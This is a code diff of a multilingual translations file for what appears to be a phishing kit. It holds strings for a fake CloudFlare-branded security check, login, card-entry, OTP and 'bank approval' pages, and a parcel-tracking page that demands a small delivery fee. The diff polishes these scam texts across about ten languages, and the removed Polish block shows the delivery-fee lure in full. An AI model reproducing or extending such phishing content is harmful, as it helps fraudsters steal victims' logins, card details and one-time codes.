@@ -21,6 +21,8 @@ export const translations = {
     signUp: "Sign up",
 
     // Payment Page
+    yourInformation: "Your Information",
+    emailAddress: "Email address",
     paymentMethod: "Payment Method",
     addPaymentMethod: "Add a payment method to complete your purchase",
     cardNumber: "Card Number",
@@ -116,14 +118,16 @@ export const translations = {
     signUp: "Registrieren",
 
     // Payment Page
+    yourInformation: "Ihre Informationen",
+    emailAddress: "E-Mail-Adresse",
     paymentMethod: "Zahlungsmethode",
-    addPaymentMethod: "Fügen Sie eine Zahlungsmethode hinzu, um Ihren Kauf abzuschließen",
+    addPaymentMethod: "Fügen Sie eine Zahlungsmethode hinzu, um Ihren Einkauf abzuschließen",
     cardNumber: "Kartennummer",
     nameOnCard: "Name auf der Karte",
-    expiryDate: "Ablaufdatum",
+    expiryDate: "Verfallsdatum",
     cvv: "CVV",
-    saveCard: "Karte für zukünftige Käufe speichern",
-    continuePayment: "Weiter zur Zahlung",
+    saveCard: "Karte für zukünftige Einkäufe speichern",
+    continuePayment: "Zur Zahlung fortfahren",
     securePayment: "Ihre Zahlungsinformationen sind sicher und verschlüsselt",
 
     // OTP Page
@@ -211,13 +215,15 @@ export const translations = {
     signUp: "Registrarse",
 
     // Payment Page
+    yourInformation: "Su Información",
+    emailAddress: "Dirección de Correo",
     paymentMethod: "Método de Pago",
     addPaymentMethod: "Agregue un método de pago para completar su compra",
     cardNumber: "Número de Tarjeta",
     nameOnCard: "Nombre en la Tarjeta",
     expiryDate: "Fecha de Vencimiento",
     cvv: "CVV",
-    saveCard: "Guardar tarjeta para futuras compras",
+    saveCard: "Guardar tarjeta para compras futuras",
     continuePayment: "Continuar al Pago",
     securePayment: "Su información de pago es segura y está encriptada",
 
@@ -306,6 +312,8 @@ export const translations = {
     signUp: "Zaregistrovat se",
 
     // Payment Page
+    yourInformation: "Vaše Informace",
+    emailAddress: "E-mailová Adresa",
     paymentMethod: "Platební metoda",
     addPaymentMethod: "Přidejte platební metodu pro dokončení nákupu",
     cardNumber: "Číslo karty",
@@ -401,6 +409,8 @@ export const translations = {
     signUp: "S'inscrire",
 
     // Payment Page
+    yourInformation: "Vos Informations",
+    emailAddress: "Adresse E-mail",
     paymentMethod: "Méthode de paiement",
     addPaymentMethod: "Ajoutez un moyen de paiement pour finaliser votre achat",
     cardNumber: "Numéro de carte",
@@ -478,31 +488,33 @@ export const translations = {
     // CAPTCHA Page
     securityCheck: "فحص الأمان",
     securityCheckDesc: "لحماية حسابك، يرجى إكمال هذا التحقق السريع للمتابعة.",
-    enterCode: "أدخل الرمز المكون من 4 أرقام",
+    enterCode: "أدخل رمز 4 أرقام",
     verifyIdentity: "التحقق من الهوية",
-    protectedBy: "محمي بواسطة CloudFlare Global Network",
+    protectedBy: "محمي بواسطة شبكة CloudFlare العالمية",
     refreshCode: "تحديث الرمز",
 
     // Login Page
-    welcomeBack: "مرحباً بعودتك",
-    signInToContinue: "سجّل الدخول إلى حسابك لمواصلة التسوق",
+    welcomeBack: "أهلا بعودتك",
+    signInToContinue: "سجّل الدخول إلى حسابك للمتابعة",
     emailOrPhone: "البريد الإلكتروني أو رقم الهاتف",
     password: "كلمة المرور",
     rememberMe: "تذكرني",
-    forgotPassword: "نسيت كلمة المرور؟",
+    forgotPassword: "هل نسيت كلمة المرور؟",
     signIn: "تسجيل الدخول",
-    orContinueWith: "أو المتابعة مع",
+    orContinueWith: "أو متابعة مع",
     noAccount: "ليس لديك حساب؟",
-    signUp: "إنشاء حساب",
+    signUp: "سجل",
 
     // Payment Page
+    yourInformation: "معلوماتك",
+    emailAddress: "عنوان البريد الإلكتروني",
     paymentMethod: "طريقة الدفع",
-    addPaymentMethod: "أضف طريقة دفع لإتمام عملية الشراء",
+    addPaymentMethod: "أضف طريقة دفع لإكمال عملية الشراء",
     cardNumber: "رقم البطاقة",
     nameOnCard: "الاسم على البطاقة",
-    expiryDate: "تاريخ الانتهاء",
+    expiryDate: "تاريخ انتهاء الصلاحية",
     cvv: "CVV",
-    saveCard: "حفظ البطاقة للمشتريات المستقبلية",
+    saveCard: "حفظ البطاقة للعمليات الشرائية المستقبلية",
     continuePayment: "المتابعة إلى الدفع",
     securePayment: "معلومات الدفع الخاصة بك آمنة ومشفرة",
 
@@ -572,33 +584,35 @@ export const translations = {
   tr: {
     // CAPTCHA Page
     securityCheck: "Güvenlik Kontrolü",
-    securityCheckDesc: "Hesabınızı korumak için devam etmek üzere bu hızlı doğrulamayı tamamlayın.",
+    securityCheckDesc: "Hesabınızı korumak için lütfen devam etmek için bu hızlı doğrulamayı tamamlayın.",
     enterCode: "4 haneli kodu girin",
     verifyIdentity: "Kimliği Doğrula",
-    protectedBy: "CloudFlare Global Network tarafından korunmaktadır",
+    protectedBy: "CloudFlare Global Network tarafından korumalı",
     refreshCode: "Kodu Yenile",
 
     // Login Page
-    welcomeBack: "Tekrar Hoş Geldiniz",
-    signInToContinue: "Alışverişe devam etmek için hesabınıza giriş yapın",
+    welcomeBack: "Hoş Geldiniz",
+    signInToContinue: "Devam etmek için hesabınıza giriş yapın",
     emailOrPhone: "E-posta veya Telefon Numarası",
     password: "Şifre",
-    rememberMe: "Beni Hatırla",
-    forgotPassword: "Şifremi Unuttum?",
+    rememberMe: "Beni hatırla",
+    forgotPassword: "Şifremi unuttum?",
     signIn: "Giriş Yap",
-    orContinueWith: "Veya şununla devam et",
+    orContinueWith: "Veya devam edin",
     noAccount: "Hesabınız yok mu?",
     signUp: "Kaydol",
 
     // Payment Page
+    yourInformation: "Bilgileriniz",
+    emailAddress: "E-posta Adresi",
     paymentMethod: "Ödeme Yöntemi",
     addPaymentMethod: "Satın alma işleminizi tamamlamak için bir ödeme yöntemi ekleyin",
     cardNumber: "Kart Numarası",
-    nameOnCard: "Kart Üzerindeki İsim",
+    nameOnCard: "Karta Yazılı Ad",
     expiryDate: "Son Kullanma Tarihi",
     cvv: "CVV",
     saveCard: "Kartı gelecekteki alışverişler için kaydet",
-    continuePayment: "Ödemeye Devam Et",
+    continuePayment: "Ödeme İçin Devam Et",
     securePayment: "Ödeme bilgileriniz güvenli ve şifrelenmiştir",
 
     // OTP Page
@@ -781,15 +795,17 @@ export const translations = {
     signUp: "Registrati",
 
     // Payment Page
-    paymentMethod: "Metodo di Pagamento",
+    yourInformation: "Tue Informazioni",
+    emailAddress: "Indirizzo E-mail",
+    paymentMethod: "Metodo di pagamento",
     addPaymentMethod: "Aggiungi un metodo di pagamento per completare l'acquisto",
-    cardNumber: "Numero di Carta",
-    nameOnCard: "Nome sulla Carta",
-    expiryDate: "Data di Scadenza",
+    cardNumber: "Numero della carta",
+    nameOnCard: "Nome sulla carta",
+    expiryDate: "Data di scadenza",
     cvv: "CVV",
     saveCard: "Salva carta per acquisti futuri",
-    continuePayment: "Continua al Pagamento",
-    securePayment: "Le informazioni di pagamento sono sicure e crittografate",
+    continuePayment: "Continua al pagamento",
+    securePayment: "Le tue informazioni di pagamento sono sicure e crittografate",
 
     // OTP Page
     verifyPhone: "Verifica il tuo Telefono",
@@ -876,14 +892,16 @@ export const translations = {
     signUp: "Cadastre-se",
 
     // Payment Page
+    yourInformation: "Suas Informações",
+    emailAddress: "Endereço de E-mail",
     paymentMethod: "Método de Pagamento",
     addPaymentMethod: "Adicione um método de pagamento para concluir sua compra",
     cardNumber: "Número do Cartão",
     nameOnCard: "Nome no Cartão",
-    expiryDate: "Data de Validade",
+    expiryDate: "Data de Vencimento",
     cvv: "CVV",
     saveCard: "Salvar cartão para compras futuras",
-    continuePayment: "Continuar para Pagamento",
+    continuePayment: "Continuar para o Pagamento",
     securePayment: "Suas informações de pagamento são seguras e criptografadas",
 
     // OTP Page
@@ -971,77 +989,17 @@ export const translations = {
     signUp: "Zarejestruj się",
 
     // Payment Page
-    paymentMethod: "Metoda płatności",
+    yourInformation: "Twoje Informacje",
+    emailAddress: "Adres E-mail",
+    paymentMethod: "Metoda Płatności",
     addPaymentMethod: "Dodaj metodę płatności, aby dokończyć zakup",
-    cardNumber: "Numer karty",
-    nameOnCard: "Imię i nazwisko na karcie",
-    expiryDate: "Data ważności",
+    cardNumber: "Numer Karty",
+    nameOnCard: "Imię i Nazwisko na Karcie",
+    expiryDate: "Data Wygaśnięcia",
     cvv: "CVV",
     saveCard: "Zapisz kartę do przyszłych zakupów",
-    continuePayment: "Przejdź do płatności",
-    securePayment: "Twoje dane płatnicze są bezpieczne i zaszyfrowane",
-
-    // OTP Page
-    verifyPhone: "Zweryfikuj swój telefon",
-    otpSent: "Wysłaliśmy kod weryfikacyjny na Twój numer telefonu",
-    enterOtp: "Wprowadź kod weryfikacyjny",
-    didntReceive: "Nie otrzymałeś kodu?",
-    resend: "Wyślij ponownie",
-    verify: "Zweryfikuj",
-
-    // Bank Approval Page
-    bankApproval: "Wymagana zgoda banku",
-    bankApprovalDesc: "Twój bank wymaga dodatkowej weryfikacji dla tej transakcji",
-    waitingApproval: "Oczekiwanie na zatwierdzenie...",
-    checkBankApp: "Sprawdź aplikację mobilną swojego banku lub SMS w sprawie żądania zatwierdzenia",
-    thisWillTake: "Zazwyczaj zajmuje to 1-2 minuty",
-
-    // Processing Page
-    processing: "Przetwarzanie...",
-    pleaseWait: "Poczekaj, aż przetworzymy Twoje żądanie",
-    doNotClose: "Nie zamykaj tego okna",
-
-    // Declined Page
-    paymentDeclined: "Płatność odrzucona",
-    cardDeclined: "Twoja karta została odrzucona. Spróbuj innej metody płatności.",
-    tryAgain: "Spróbuj ponownie",
-    useAnotherCard: "Użyj innej karty",
-
-    // Common
-    loading: "Ładowanie...",
-    error: "Błąd",
-    success: "Sukces",
-    cancel: "Anuluj",
-    back: "Wstecz",
-    next: "Dalej",
-    location: "Lokalizacja",
-    termsOfUse: "Warunki użytkowania",
-    privacyPolicy: "Polityka prywatności",
-    bySigningIn: "Logując się, zgadzasz się na",
-    and: "i",
-    addNewCard: "Dodaj nową kartę",
-    incorrectCode: "Nieprawidłowy kod. Spróbuj ponownie.",
-    invalidCode: "Nieprawidłowy kod. Spróbuj ponownie.",
-    deliveryFeeNotice: "Aby dokończyć zamówienie, wymagana jest opłata za dostawę do domu w wysokości 3,00 $.",
-    
-    // Tracking Page
-    packageTracking: "Śledzenie Paczki",
-    orderNumber: "Zamówienie #",
-    shippingStatus: "Status Wysyłki",
-    packageArrived: "Paczka Przybyła",
-    waitingForPayment: "Oczekiwanie na opłatę za dostawę do domu",
-    origin: "Pochodzenie",
-    destination: "Przeznaczenie",
-    shippedFrom: "Wysłane w",
-    shippedFromWarehouse: "Wysłane z magazynu",
-    arrivedAtDestination: "Przybyło do miejsca przeznaczenia",
-    today: "Dzisiaj",
-    buyerProtection: "Ochrona Kupującego",
-    protectionDesc: "Twoje zamówienie jest chronione do potwierdzenia dostawy",
-    actionRequired: "Wymagane Działanie",
-    arrivalMessage: "Twoja paczka przybyła! Proszę zapłacić opłatę za dostawę do domu, aby dokończyć dostawę do Twoich drzwi.",
-    payNow: "Zapłać Teraz",
-    location: "Lokalizacja",
+    continuePayment: "Kontynuuj Płatność",
+    securePayment: "Twoje informacje o płatności są bezpieczne i szyfrowane",
     
     // Email validation
     invalidEmail: "Please enter a valid email address",
